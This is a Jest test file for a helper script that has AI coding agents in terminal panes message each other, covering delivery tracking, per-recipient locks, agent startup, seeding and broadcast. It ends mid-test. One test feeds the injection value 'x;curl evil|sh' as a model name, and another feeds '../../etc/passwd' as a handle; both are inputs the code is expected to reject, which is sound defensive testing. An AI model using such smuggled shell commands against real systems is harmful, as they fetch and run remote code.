const fs = require('fs');
const os = require('os');
const path = require('path');

const h = require('../skills/herdr/scripts/herd.js');

// Every lock-touching test gets its own root so suites never contend, and so a
// leaked lock in one test cannot mask a bug in the next.
const LOCK_DIRS = [];
function freshLockDir() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'herd-lock-test-'));
  LOCK_DIRS.push(dir);
  return dir;
}
afterAll(() => {
  for (const dir of LOCK_DIRS) fs.rmSync(dir, { recursive: true, force: true });
});

const AGENTS = {
  result: {
    agents: [
      { name: 'sly', agent: 'claude', pane_id: 'w1:p1', workspace_id: 'w1', agent_status: 'idle' },
      { name: 'jay', agent: 'codex', pane_id: 'w1:p2', workspace_id: 'w1', agent_status: 'working' },
      { name: 'tim', agent: 'opencode', pane_id: 'w2:p1', workspace_id: 'w2', agent_status: 'done' },
      { pane_id: 'w3:p1', workspace_id: 'w3', agent_status: 'idle' }, // unnamed
    ],
  },
};

describe('pane', () => {
  test('returns pane_id for a handle', () => {
    expect(h.pane(AGENTS, 'jay')).toBe('w1:p2');
  });
  test('undefined for unknown handle', () => {
    expect(h.pane(AGENTS, 'nope')).toBeUndefined();
  });
});

describe('status', () => {
  test('by handle', () => { expect(h.status(AGENTS, 'tim')).toBe('done'); });
  test('by pane_id', () => { expect(h.status(AGENTS, 'w1:p1')).toBe('idle'); });
});

describe('members', () => {
  test('all named handles when no workspace', () => {
    expect(h.members(AGENTS).sort()).toEqual(['jay', 'sly', 'tim']);
  });
  test('filtered by workspace_id', () => {
    expect(h.members(AGENTS, 'w1').sort()).toEqual(['jay', 'sly']);
  });
  // Deliberately unfiltered: `agent` needs self present for its handle-collision
  // preflight. That is why roster diffing belongs to `sync` (which excludes
  // self) and NOT to a hand-rolled diff of this list, which self-adds.
  test('includes the caller, so it is not a roster diff on its own', () => {
    expect(h.members(AGENTS, 'w1')).toContain('sly'); // AGENTS' w1:p1 caller
  });
});

describe('format', () => {
  test('arrays join by newline', () => { expect(h.format(['a', 'b'])).toBe('a\nb'); });
  test('null/undefined -> empty string', () => {
    expect(h.format(undefined)).toBe('');
    expect(h.format(null)).toBe('');
  });
  test('scalars stringified', () => { expect(h.format('w7')).toBe('w7'); });
  test('per-recipient result arrays print as JSON, not [object Object]', () => {
    expect(h.format([{ handle: 'jay', delivery: 'observed' }]))
      .toBe('[{"handle":"jay","delivery":"observed"}]');
  });
});

// The helper is stdin-free: every verb fetches its own state via `herdr`.
describe('dispatch (self-contained verbs)', () => {
  const deps = () => {
    const calls = [];
    return { calls, deps: { run: (f, a) => { calls.push([f, ...a]); return JSON.stringify(AGENTS); } } };
  };

  test('status fetches the agent list itself', () => {
    const { calls, deps: d } = deps();
    expect(h.dispatch(['status', 'tim'], d)).toBe('done');
    expect(calls).toEqual([['herdr', 'agent', 'list']]);
  });
  test('members --workspace fetches and filters', () => {
    const { deps: d } = deps();
    expect(h.dispatch(['members', '--workspace', 'w2'], d)).toEqual(['tim']);
  });
  test('removed verbs (pane/field/submit-keys) are unknown commands', () => {
    for (const verb of [['pane', 'jay'], ['field', 'result.x'], ['submit-keys', 'jay']]) {
      expect(() => h.dispatch(verb, deps().deps)).toThrow(/unknown command/);
    }
  });
  test('throws on unknown command', () => {
    expect(() => h.dispatch(['bogus'], deps().deps)).toThrow(/unknown command/);
  });
  test('the herd-lifecycle verbs are routed, not silently unknown', () => {
    for (const verb of ['seed', 'broadcast', 'sync', 'withdraw']) {
      expect(() => h.dispatch([verb], deps().deps)).not.toThrow(/unknown command/);
    }
  });
});

describe('parseWait', () => {
  test('defaults: idle, 45s, 1s interval', () => {
    expect(h.parseWait(['jay'])).toEqual({ handle: 'jay', statuses: ['idle'], timeout: 45000, interval: 1000 });
  });
  test('comma statuses and overrides', () => {
    expect(h.parseWait(['jay', '--status', 'idle,done', '--timeout', '9000', '--interval', '250']))
      .toEqual({ handle: 'jay', statuses: ['idle', 'done'], timeout: 9000, interval: 250 });
  });
});

describe('waitCmd', () => {
  test('returns as soon as the status matches one of the set', () => {
    const seq = ['working', 'working', 'done']; let i = 0;
    const deps = {
      run: () => JSON.stringify({ result: { agents: [{ name: 'jay', agent_status: seq[i++] }] } }),
      sleep: () => {}, now: () => 0,
    };
    expect(h.waitCmd(['jay', '--status', 'idle,done', '--interval', '1'], deps)).toBe('done');
  });
  test('throws on timeout, reporting the last seen status', () => {
    let t = 0;
    const deps = {
      run: () => JSON.stringify({ result: { agents: [{ name: 'jay', agent_status: 'working' }] } }),
      sleep: () => {}, now: () => (t += 1000),
    };
    expect(() => h.waitCmd(['jay', '--timeout', '1500', '--interval', '1'], deps))
      .toThrow(/wait timeout: jay is working, want idle/);
  });
});

describe('resolveSelf', () => {
  const DATA = { result: { agents: [
    { name: 'paul', pane_id: 'w1M:p5' },
    { name: 'cal', pane_id: 'w1M:p4', focused: true },
  ] } };

  test('override wins over everything', () => {
    expect(h.resolveSelf(DATA, 'kris', { HERDR_PANE_ID: 'w1M:p5' })).toBe('kris');
  });
  test('resolves the executing pane from HERDR_PANE_ID, not the focused agent', () => {
    expect(h.resolveSelf(DATA, undefined, { HERDR_PANE_ID: 'w1M:p5' })).toBe('paul');
  });
  test('falls back to the focused agent when HERDR_PANE_ID is absent', () => {
    expect(h.resolveSelf(DATA, undefined, {})).toBe('cal');
  });
  test('falls back to the focused agent when HERDR_PANE_ID matches no agent', () => {
    expect(h.resolveSelf(DATA, undefined, { HERDR_PANE_ID: 'w9:p9' })).toBe('cal');
  });
});

// Delivery is three-valued and never collapsed into a boolean:
//   observed      submitted AND corroborated (turn start, or the id echoed)
//   accepted      submitted, nothing corroborated it - UNKNOWN, not failed
//   undeliverable herdr refused before typing; nothing was sent
// The distinction matters because only `undeliverable` is safe to resend.
describe('sendCmd', () => {
  // statuses: sequence served by successive `agent list` calls
  // prompt: per-call behaviour, last entry repeats. 'ok' | 'timeout' | 'enoent'
  //         | any herdr error code (delivered as a JSON envelope on stderr)
  // echo:   text returned by `agent read` (the recipient's pane)
  function runner({ focused, statuses = ['idle'], prompt = 'ok', echo = '', nonce = 'abc123' } = {}) {
    const calls = [];
    let li = 0;
    let pi = 0;
    const behaviours = Array.isArray(prompt) ? prompt : [prompt];
    const list = () => {
      const st = statuses[Math.min(li++, statuses.length - 1)];
      return JSON.stringify({ result: { agents: [
        { name: 'jay', agent: 'claude', pane_id: 'w1:p2', agent_status: st, state_change_seq: 7 },
        { name: 'sly', agent: 'claude', pane_id: 'w1:p1', focused: !!focused },
        { name: 'cod', agent: 'codex', pane_id: 'w1:p3', agent_status: st },
      ] } });
    };
    const run = (f, a) => {
      calls.push([f, ...a]);
      if (a[0] === 'agent' && a[1] === 'list') return list();
      if (a[0] === 'agent' && a[1] === 'read') return echo;
      if (a[0] === 'agent' && a[1] === 'prompt') {
        const b = behaviours[Math.min(pi++, behaviours.length - 1)];
        if (b === 'ok') return '';
        if (b === 'timeout') throw new Error('timed out waiting for agent status');
        if (b === 'enoent') {
          const e = new Error('spawn herdr ENOENT');
          e.code = 'ENOENT';
          throw e;
        }
        const e = new Error('herdr agent prompt failed');
        e.stderr = JSON.stringify({ error: { code: b } });
        throw e;
      }
      return '';
    };
    const prompts = () => calls.filter((c) => c[1] === 'agent' && c[2] === 'prompt');
    const deps = {
      run, env: {}, sleep: () => {}, now: () => Date.now(),
      nonce: () => nonce, lockDir: freshLockDir(),
    };
    return { deps, calls, prompts };
  }

  test('happy path: one atomic submit+wait, observed by turn start', () => {
    const { deps, calls } = runner();
    expect(h.sendCmd(['jay', 'rerun the test'], deps)).toEqual({
      result: { type: 'ok' },
      pane: 'w1:p2',
      sent: 'rerun the test',
      id: undefined,
      before: 'idle',
      seq: 7,
      delivery: 'observed',
      evidence: 'turn-start',
      reason: undefined,
      attempts: 1,
    });
    expect(calls).toEqual([
      ['herdr', 'agent', 'list'],
      ['herdr', 'agent', 'list'], // re-read inside the lock: state can change while queueing
      ['herdr', 'agent', 'prompt', 'jay', 'rerun the test', '--wait', '--until', 'working', '--timeout', '6000'],
    ]);
  });

  test('a single atomic prompt call carries the whole body and the wait flags', () => {
    const { deps, prompts } = runner();
    h.sendCmd(['cod', 'hello'], deps);
    expect(prompts()).toEqual([
      ['herdr', 'agent', 'prompt', 'cod', 'hello', '--wait', '--until', 'working', '--timeout', '6000'],
    ]);
  });

  test('submitted but unobserved -> accepted (UNKNOWN), and never re-sent', () => {
    const { deps, prompts } = runner({ prompt: 'timeout' });
    const out = h.sendCmd(['jay', 'hello', '--reply', '--from', 'sly'], deps);
    expect(out.delivery).toBe('accepted');
    expect(out.evidence).toBeUndefined();
    expect(out.reason).toBe('unobserved');
    expect(prompts()).toHaveLength(1); // herdr already submitted; a resend duplicates
  });

  test('the id echoing in the recipient pane upgrades accepted -> observed', () => {
    const { deps, prompts } = runner({
      prompt: 'timeout',
      echo: 'transcript...\n[from sly reply #abc123] hello\n',
    });
    const out = h.sendCmd(['jay', 'hello', '--reply', '--from', 'sly'], deps);
    expect(out).toMatchObject({ delivery: 'observed', evidence: 'echo', id: 'abc123' });
    expect(prompts()).toHaveLength(1); // corroboration never re-sends
  });

  test('a missing echo never triggers a resend - it only leaves the result unknown', () => {
    const { deps, calls, prompts } = runner({ prompt: 'timeout', echo: 'unrelated scrollback' });
    expect(h.sendCmd(['jay', 'hello', '--reply', '--from', 'sly'], deps).delivery).toBe('accepted');
    expect(prompts()).toHaveLength(1);
    expect(calls.filter((c) => c[2] === 'read')).toHaveLength(3); // bounded, then gives up
  });

  test('echo is read from recent-unwrapped, so soft wraps cannot split the id', () => {
    const { deps, calls } = runner({ prompt: 'timeout' });
    h.sendCmd(['jay', 'hi', '--reply', '--from', 'sly'], deps);
    expect(calls).toContainEqual(
      ['herdr', 'agent', 'read', 'jay', '--source', 'recent-unwrapped', '--lines', '60']);
  });

  test('a blocked recipient is undeliverable: a modal eats keystrokes, so we never type', () => {
    const { deps, prompts } = runner({ statuses: ['blocked'] });
    const out = h.sendCmd(['jay', 'hi', '--reply', '--from', 'sly'], deps);
    expect(out).toMatchObject({ delivery: 'undeliverable', reason: 'recipient_blocked' });
    expect(prompts()).toHaveLength(0);
  });

  test('a recipient that becomes blocked while we queue for the lock is caught inside it', () => {
    // idle when first sampled, blocked by the time the lock is held
    const { deps, prompts } = runner({ statuses: ['idle', 'blocked'] });
    expect(h.sendCmd(['jay', 'hi'], deps))
      .toMatchObject({ delivery: 'undeliverable', reason: 'recipient_blocked' });
    expect(prompts()).toHaveLength(0);
  });

  test('--force overrides the blocked gate', () => {
    const { deps, prompts } = runner({ statuses: ['blocked'] });
    expect(h.sendCmd(['jay', 'hi', '--force'], deps).delivery).toBe('observed');
    expect(prompts()).toHaveLength(1);
  });

  test.each(['working', 'done', 'unknown', 'idle'])('a %s recipient is still sent to', (st) => {
    const { deps, prompts } = runner({ statuses: [st] });
    expect(h.sendCmd(['jay', 'hi'], deps).delivery).toBe('observed');
    expect(prompts()).toHaveLength(1);
  });

  test('a stale done never gates: the CLI cannot clear it, so gating would deadlock the herd', () => {
    const { deps } = runner({ statuses: ['done'] });
    expect(h.sendCmd(['jay', 'hi'], deps)).toMatchObject({ before: 'done', delivery: 'observed' });
  });

  test('agent_not_found is undeliverable and is not retried', () => {
    const { deps, prompts } = runner({ prompt: 'agent_not_found' });
    expect(h.sendCmd(['jay', 'hi'], deps))
      .toMatchObject({ delivery: 'undeliverable', reason: 'agent_not_found' });
    expect(prompts()).toHaveLength(1);
  });

  test('agent_pane_busy never typed, so it is retried once, then reported', () => {
    const { deps, prompts } = runner({ prompt: 'agent_pane_busy' });
    expect(h.sendCmd(['jay', 'hi'], deps))
      .toMatchObject({ delivery: 'undeliverable', reason: 'agent_pane_busy', attempts: 2 });
    expect(prompts()).toHaveLength(2);
  });

  test('a retried agent_pane_busy that then succeeds is observed', () => {
    const { deps, prompts } = runner({ prompt: ['agent_pane_busy', 'ok'] });
    expect(h.sendCmd(['jay', 'hi'], deps)).toMatchObject({ delivery: 'observed', attempts: 2 });
    expect(prompts()).toHaveLength(2);
  });

  test('a missing herdr binary is undeliverable, not an unknown', () => {
    const { deps } = runner({ prompt: 'enoent' });
    expect(h.sendCmd(['jay', 'hi'], deps))
      .toMatchObject({ delivery: 'undeliverable', reason: 'herdr_unavailable' });
  });

  test('a live lock holder makes the send undeliverable rather than interleaving', () => {
    const { deps, prompts } = runner();
    const held = h.acquireLock('jay', deps, 0); // this process holds it, and is alive
    expect(held).toBeTruthy();
    expect(h.sendCmd(['jay', 'hi'], deps))
      .toMatchObject({ delivery: 'undeliverable', reason: 'lock_busy' });
    expect(prompts()).toHaveLength(0);
    h.releaseLock(held);
  });

  test('the lock is released after a send, so the next sender proceeds', () => {
    const { deps } = runner();
    expect(h.sendCmd(['jay', 'one'], deps).delivery).toBe('observed');
    expect(h.sendCmd(['jay', 'two'], deps).delivery).toBe('observed');
  });

  test('--reply --from stamps the protocol header with a delivery id', () => {
    const { deps, calls } = runner();
    expect(h.sendCmd(['jay', 'status?', '--reply', '--from', 'sly'], deps).sent)
      .toBe('[from sly reply #abc123] status?');
    expect(calls).toContainEqual(
      ['herdr', 'agent', 'prompt', 'jay', '[from sly reply #abc123] status?',
        '--wait', '--until', 'working', '--timeout', '6000']);
  });

  test('--fyi resolves <self> from the executing pane, not the focused agent', () => {
    const { deps } = runner({ focused: true });
    deps.env = { HERDR_PANE_ID: 'w1:p2' }; // jay is running the send
    expect(h.sendCmd(['cod', 'heads up', '--fyi'], deps).sent).toBe('[from jay fyi #abc123] heads up');
  });

  test('does not double-prefix an already [from ...] message, and reuses its id', () => {
    const { deps } = runner({ focused: true });
    const out = h.sendCmd(['jay', '[from sly reply #zz99] hi', '--reply'], deps);
    expect(out.sent).toBe('[from sly reply #zz99] hi');
    expect(out.id).toBe('zz99');
  });

  test('an unstamped send carries no id, so echo corroboration is unavailable', () => {
    const { deps, calls } = runner({ prompt: 'timeout' });
    expect(h.sendCmd(['jay', 'raw directive'], deps))
      .toMatchObject({ id: undefined, delivery: 'accepted' });
    expect(calls.filter((c) => c[2] === 'read')).toHaveLength(0);
  });

  test('throws on unknown handle', () => {
    const { deps } = runner();
    expect(() => h.sendCmd(['ghost', 'hi'], deps)).toThrow(/no agent: ghost/);
  });

  test('--reply with no focused agent and no --from throws (no silent mis-stamp)', () => {
    const { deps } = runner();
    expect(() => h.sendCmd(['jay', 'hi', '--reply'], deps)).toThrow(/cannot resolve sender handle/);
  });

  test('--from without a value throws instead of being silently ignored', () => {
    const { deps } = runner({ focused: true });
    expect(() => h.sendCmd(['jay', 'hi', '--reply', '--from'], deps)).toThrow(/--from needs a value/);
  });

  // The old boolean is gone rather than redefined: one field could not answer
  // both "did herdr submit it" and "did we see it taken", and either reading
  // misleads a caller asking the other. `delivery` says which.
  test('the ambiguous submitted boolean is gone from every outcome', () => {
    for (const behaviour of ['ok', 'timeout', 'agent_not_found']) {
      expect(h.sendCmd(['jay', 'x'], runner({ prompt: behaviour }).deps))
        .not.toHaveProperty('submitted');
    }
  });
});

describe('sendWaitReadCmd', () => {
  function runner() {
    const calls = [];
    const seq = ['working', 'done'];
    let i = 0;
    const run = (f, a) => {
      calls.push([f, ...a]);
      if (a[0] === 'agent' && a[1] === 'list') {
        return JSON.stringify({ result: { agents: [
          { name: 'gus', agent: 'claude', pane_id: 'w1:p2', agent_status: seq[Math.min(i++, seq.length - 1)] },
          { name: 'sly', agent: 'claude', pane_id: 'w1:p1', focused: true },
        ] } });
      }
      if (a[0] === 'pane' && a[1] === 'read') return 'REVIEW: looks good\n';
      return '';
    };
    return {
      calls,
      deps: { run, sleep: () => {}, now: () => 0, nonce: () => 'n1', lockDir: freshLockDir(), env: {} },
    };
  }

  test('sends, waits for not-working, reads recent, returns the text', () => {
    const { calls, deps } = runner();
    const out = h.sendWaitReadCmd(['gus', 'review please', '--reply', '--from', 'sly', '--lines', '50'], deps);
    expect(out).toBe('REVIEW: looks good\n');
    expect(calls).toContainEqual(
      ['herdr', 'agent', 'prompt', 'gus', '[from sly reply #n1] review please', '--wait', '--until', 'working', '--timeout', '6000']);
    expect(calls).toContainEqual(['herdr', 'pane', 'read', 'w1:p2', '--source', 'recent', '--lines', '50']);
  });

  test('an undeliverable send throws instead of waiting on a message never sent', () => {
    const { deps } = runner();
    const inner = deps.run;
    deps.run = (f, a) => {
      if (a[0] === 'agent' && a[1] === 'prompt') {
        const e = new Error('refused');
        e.stderr = JSON.stringify({ error: { code: 'agent_not_found' } });
        throw e;
      }
      return inner(f, a);
    };
    expect(() => h.sendWaitReadCmd(['gus', 'hi', '--reply', '--from', 'sly'], deps))
      .toThrow(/undeliverable to gus: agent_not_found/);
  });
});

// agent verb: tab create -> agent start --kind/--pane (agent takes over the
// tab's root pane) -> wait until the agent is ready.
describe('agentCmd', () => {
  const TAB = JSON.stringify({ result: { tab: { tab_id: 'wR:t2' }, root_pane: { pane_id: 'wR:p2' } } });
  function runner(existing = []) {
    const calls = [];
    const run = (f, a) => {
      calls.push([f, ...a]);
      if (a[0] === 'agent' && a[1] === 'list') {
        return JSON.stringify({ result: { agents: existing.map((name) => ({ name })) } });
      }
      if (a[0] === 'tab' && a[1] === 'create') return TAB;
      if (a[0] === 'agent' && a[1] === 'start') {
        const paneIdx = a.indexOf('--pane') + 1;
        return JSON.stringify({ result: { agent: { pane_id: a[paneIdx], name: a[2] } } });
      }
      return '';
    };
    return { run, calls };
  }

  test('codex agent: preflight, tab create -> agent start --kind/--pane -> wait until idle', () => {
    const { run, calls } = runner();
    const out = h.agentCmd(['codex', 'jay', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
    expect(out).toEqual({
      handle: 'jay', kind: 'codex', model: null, effort: null, pane_id: 'wR:p2', tab: 'wR:t2',
    });
    expect(calls).toEqual([
      ['herdr', 'agent', 'list'],
      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'jay ◇', '--no-focus'],
      ['herdr', 'agent', 'start', 'jay', '--kind', 'codex', '--pane', 'wR:p2', '--timeout', '45000'],
      ['herdr', 'agent', 'wait', 'jay', '--until', 'idle', '--timeout', '45000'],
    ]);
  });

  test('preflight rejects a globally taken handle without creating a tab', () => {
    const { run, calls } = runner(['jay']);
    expect(() => h.agentCmd(['codex', 'jay', '--workspace', 'wR', '--cwd', '/wt/x'], { run }))
      .toThrow(/handle already taken: jay/);
    expect(calls.some((c) => c[1] === 'tab' && c[2] === 'create')).toBe(false);
  });

  test('--timeout overrides the readiness wait', () => {
    const { run, calls } = runner();
    h.agentCmd(['claude', 'sly', '--workspace', 'wR', '--cwd', '/wt/x', '--timeout', '9000'], { run });
    expect(calls).toContainEqual(['herdr', 'agent', 'wait', 'sly', '--until', 'idle', '--timeout', '9000']);
  });

  test('missing --cwd throws', () => {
    const { run } = runner();
    expect(() => h.agentCmd(['claude', 'sly', '--workspace', 'wR'], { run }))
      .toThrow(/--workspace and --cwd are required/);
  });

  test('opencode agent starts with its -m selector after --', () => {
    const { run, calls } = runner();
    h.agentCmd(['opencode', 'bob:ollama/qwen2.5:7b', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
    expect(calls).toContainEqual(
      ['herdr', 'agent', 'start', 'bob', '--kind', 'opencode', '--pane', 'wR:p2', '--timeout', '45000',
        '--', '-m', 'ollama/qwen2.5:7b']);
  });

  test('opencode agent with an unsafe model is rejected before any herdr call', () => {
    const { run, calls } = runner();
    expect(() => h.agentCmd(['opencode', 'bob:x;curl evil|sh', '--workspace', 'wR', '--cwd', '/wt/x'], { run }))
      .toThrow(/unsafe characters/);
    expect(calls).toEqual([]);
  });

  // The `agent` verb shares makeAgent with `up`, so the selector must work here
  // too - this is the verb used to add one agent to a herd that already exists.
  test('claude agent passes model/effort after -- and reports what it selected', () => {
    const { run, calls } = runner();
    const out = h.agentCmd(['claude', 'nell:model=opus,effort=high',
      '--workspace', 'wR', '--cwd', '/wt/x'], { run });
    expect(out).toEqual({
      handle: 'nell', kind: 'claude', model: 'opus', effort: 'high', pane_id: 'wR:p2', tab: 'wR:t2',
    });
    expect(calls).toContainEqual(
      ['herdr', 'agent', 'start', 'nell', '--kind', 'claude', '--pane', 'wR:p2', '--timeout', '45000',
        '--', '--model', 'opus', '--effort', 'high']);
  });

  test('codex agent renders effort as a -c config override', () => {
    const { run, calls } = runner();
    h.agentCmd(['codex', 'jay:effort=high', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
    expect(calls).toContainEqual(
      ['herdr', 'agent', 'start', 'jay', '--kind', 'codex', '--pane', 'wR:p2', '--timeout', '45000',
        '--', '-c', 'model_reasoning_effort=high']);
  });

  test('the tab label still uses the bare handle, not the selector', () => {
    const { run, calls } = runner();
    h.agentCmd(['claude', 'nell:model=opus', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
    expect(calls).toContainEqual(
      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'nell ◆', '--no-focus']);
  });
});

// The lock is the only thing standing between two senders and one garbled
// composer, so it is tested as the cross-process primitive it has to be.
describe('per-recipient send lock', () => {
  test('mkdir exclusion: a second acquire fails while the first is held', () => {
    const deps = { lockDir: freshLockDir(), sleep: () => {}, now: () => Date.now(), env: {} };
    const first = h.acquireLock('jay', deps, 0);
    expect(first).toBeTruthy();
    expect(h.acquireLock('jay', deps, 0)).toBeUndefined();
    h.releaseLock(first);
    expect(h.acquireLock('jay', deps, 0)).toBeTruthy();
  });

  test('different recipients never contend', () => {
    const deps = { lockDir: freshLockDir(), sleep: () => {}, now: () => Date.now(), env: {} };
    expect(h.acquireLock('jay', deps, 0)).toBeTruthy();
    expect(h.acquireLock('sly', deps, 0)).toBeTruthy();
  });

  test('a crashed holder is reclaimed - a dead pid cannot be mid-keystrokes', () => {
    const dir = freshLockDir();
    const deps = { lockDir: dir, sleep: () => {}, now: () => Date.now(), env: {} };
    const lock = h.lockPath(dir, 'jay');
    fs.mkdirSync(lock, { recursive: true });
    // pid 1 exists; a pid this large has never been allocated on a live system
    fs.writeFileSync(path.join(lock, 'owner.json'), JSON.stringify({ pid: 0x7ffffff0 }));
    expect(h.acquireLock('jay', deps, 0)).toBeTruthy();
  });

  test('a LIVE holder is never broken on age alone, however old the lock is', () => {
    const dir = freshLockDir();
    const deps = { lockDir: dir, sleep: () => {}, now: () => Date.now(), env: {} };
    const lock = h.lockPath(dir, 'jay');
    fs.mkdirSync(lock, { recursive: true });
    fs.writeFileSync(path.join(lock, 'owner.json'),
      JSON.stringify({ pid: process.pid, at: 0 })); // ancient, but alive
    expect(h.acquireLock('jay', deps, 0)).toBeUndefined();
  });

  test('a contended lock gives up rather than spinning on a frozen clock', () => {
    const dir = freshLockDir();
    const deps = { lockDir: dir, sleep: () => {}, now: () => 0, env: {} }; // clock never advances
    expect(h.acquireLock('jay', deps, 0)).toBeTruthy();
    expect(h.acquireLock('jay', deps, 300)).toBeUndefined();
  });

  // A shared tmpdir root created by one user is unwritable by the next, which
  // would fail every send on an EACCES from mkdir.
  test('the default lock root is per-uid, so one user cannot wedge another', () => {
    expect(h.lockRoot({})).toBe(path.join(os.tmpdir(), `herd-send-locks-${process.getuid()}`));
    expect(h.lockRoot({ lockDir: '/given' })).toBe('/given'); // explicit root still wins
  });

  test('holderAlive: this process is alive, an unallocated pid is not', () => {
    expect(h.holderAlive(process.pid)).toBe(true);
    expect(h.holderAlive(0x7ffffff0)).toBe(false);
    expect(h.holderAlive(undefined)).toBe(false);
  });

  test('a handle that would escape the lock directory is hashed, not interpolated', () => {
    const root = '/tmp/locks';
    expect(h.lockPath(root, '../../etc/passwd').startsWith(`${root}/`)).toBe(true);
    expect(h.lockPath(root, '../../etc/passwd')).not.toMatch(/\.\./);
    expect(h.lockPath(root, 'jay')).toBe('/tmp/locks/jay.lock');
  });
});

// A herd whose lead has left still has to run, so seeding a cold agent must be
// a command rather than prose retyped by hand.
describe('seed', () => {
  const LINE = {
    handle: 'pip', roster: ['pip', 'jay'], lead: 'jay',
    cwd: '/wt/x', helper: '/abs/herd.js', brief: 'fix the parser',
  };

  test('the seed is one line - a newline would submit the turn early', () => {
    expect(h.seedLine(LINE)).not.toMatch(/\n/);
  });

  test('it names the handle, the teammates, the lead, and the runnable helper path', () => {
    const line = h.seedLine(LINE);
    expect(line).toMatch(/you are pip/);
    expect(line).toMatch(/your teammates: jay/);
    expect(line).toMatch(/working lead: jay/);
    expect(line).toMatch(/node \/abs\/herd\.js send <handle>/);
    expect(line).toMatch(/YOUR TASK: fix the parser/);
  });

  test('it tells a self-leading agent that it drives the work', () => {
    expect(h.seedLine({ ...LINE, lead: 'pip' })).toMatch(/that is you - you drive the work/);
  });

  test('it teaches both flags, the roster directives, and the one-line rule', () => {
    const line = h.seedLine(LINE);
    expect(line).toMatch(/--reply/);
    expect(line).toMatch(/--fyi/);
    expect(line).toMatch(/\[herd \+H\]/);
    expect(line).toMatch(/one line because a newline submits the turn/);
  });

  function seedRunner({ kind = 'claude', statuses = ['idle'] } = {}) {
    const calls = [];
    let li = 0;
    const run = (f, a) => {
      calls.push([f, ...a]);
      if (a[0] === 'agent' && a[1] === 'list') {
        return JSON.stringify({ result: { agents: [
          { name: 'pip', agent: kind, pane_id: 'w1:p9', cwd: '/wt/x',
            agent_status: statuses[Math.min(li++, statuses.length - 1)] },
          { name: 'jay', agent: 'claude', pane_id: 'w1:p2', cwd: '/wt/x', agent_status: 'idle' },
        ] } });
      }
      return '';
    };
    return {
      calls,
      deps: { run, env: {}, sleep: () => {}, now: () => 0, nonce: () => 's1', lockDir: freshLockDir() },
    };
  }

  test('seeds with --reply, because the newcomer answering is the only proof', () => {
    const { calls, deps } = seedRunner();
    const out = h.seedCmd(['pip', '--roster', 'pip,jay', '--lead', 'jay', '--from', 'jay',
      '--helper', '/abs/herd.js'], deps);
    expect(out.delivery).toBe('observed');
    const prompt = calls.find((c) => c[2] === 'prompt');
    expect(prompt[4]).toMatch(/^\[from jay reply #s1\] you are pip/);
  });

  test('it does not claim a confirmation it has not waited for', () => {
    const { deps } = seedRunner();
    const out = h.seedCmd(['pip', '--roster', 'pip,jay', '--helper', '/abs/herd.js', '--from', 'jay'], deps);
    expect(out).not.toHaveProperty('turn');
  });

  test('--wait reports only that the newcomer finished a turn, plus its tail', () => {
    const { deps, calls } = seedRunner({ statuses: ['idle', 'idle', 'done'] });
    const out = h.seedCmd(['pip', '--roster', 'pip,jay', '--helper', '/abs/herd.js',
      '--from', 'jay', '--wait'], deps);
    expect(out.turn).toBe('finished');
    expect(calls).toContainEqual(['herdr', 'agent', 'read', 'pip', '--source', 'recent', '--lines', '20']);
  });

  test('a handle missing from the roster is added rather than silently dropped', () => {
    const { calls, deps } = seedRunner();
    h.seedCmd(['pip', '--roster', 'jay', '--helper', '/abs/herd.js', '--from', 'jay'], deps);
    expect(calls.find((c) => c[2] === 'prompt')[4]).toMatch(/roster: pip, jay/);
  });

  test('--roster is required: a seed without one produces an agent that cannot address anyone', () => {
    const { deps } = seedRunner();
    expect(() => h.seedCmd(['pip', '--from', 'jay'], deps)).toThrow(/--roster is required/);
  });

  // A codex peer runs its own versioned plugin cache, never this file's path,
  // so seeding one with our path hands it a command it cannot run.
  test('an unresolvable codex helper path is an error, not a guess that cannot run', () => {
    const emptyHome = freshLockDir();
    expect(() => h.helperFor('codex', undefined, '/self/herd.js', emptyHome)).toThrow(/pass --helper/);
    expect(h.helperFor('codex', '/given/path.js', '/self/herd.js', emptyHome)).toBe('/given/path.js');
    expect(h.helperFor('claude', undefined, '/self/herd.js', emptyHome)).toBe('/self/herd.js');
  });

  test('the codex helper is found in the versioned plugin cache, newest version winning', () => {
    const home = freshLockDir();
    for (const version of ['0.9.0', '0.10.0']) {
      const dir = path.join(home, '.codex', 'plugins', 'cache', 'claude-domestique',
        'comitatus', version, 'skills', 'herdr', 'scripts');
      fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(path.join(dir, 'herd.js'), '');
    }
    expect(h.codexHelper(home)).toMatch(/comitatus\/0\.10\.0\/skills\/herdr\/scripts\/herd\.js$/);
  });

  test('no codex install at all resolves to nothing rather than a fabricated path', () => {
    expect(h.codexHelper(freshLockDir())).toBeUndefined();
  });
});

describe('broadcast', () => {
  function runner(statuses = {}) {
    const calls = [];
    const run = (f, a) => {
      calls.push([f, ...a]);
      if (a[0] === 'agent' && a[1] === 'list') {
        return JSON.stringify({ result: { agents: [
          { name: 'tim', agent: 'claude', pane_id: 'w1:p1', workspace_id: 'w1', agent_status: statuses.tim || 'idle' },
          { name: 'jay', agent: 'codex', pane_id: 'w1:p2', workspace_id: 'w1', agent_status: statuses.jay || 'idle' },
          { name: 'pip', agent: 'claude', pane_id: 'w1:p3', workspace_id: 'w1', agent_status: statuses.pip || 'idle' },
          { name: 'far', agent: 'claude', pane_id: 'w9:p1', workspace_id: 'w9', agent_status: 'idle' },
        ] } });
      }
      return '';
    };
    return {
      calls,
      deps: { run, env: { HERDR_PANE_ID: 'w1:p1' }, sleep: () => {}, now: () => 0, nonce: () => 'b1', lockDir: freshLockDir() },
    };
  }

  test('reaches every peer but never the sender', () => {
    const { calls, deps } = runner();
    const out = h.broadcastCmd(['heads up', '--workspace', 'w1', '--fyi'], deps);
    expect(out.map((r) => r.handle)).toEqual(['jay', 'pip']);
    expect(out.every((r) => r.delivery === 'observed')).toBe(true);
    expect(calls.filter((c) => c[2] === 'prompt').map((c) => c[3])).toEqual(['jay', 'pip']);
  });

  test('--workspace scopes to one herd; other workspaces are other herds', () => {
    const { deps } = runner();
    expect(h.broadcastCmd(['hi', '--fyi'], deps).map((r) => r.handle)).toEqual(['jay', 'pip', 'far']);
  });

  test('--exclude drops named handles', () => {
    const { deps } = runner();
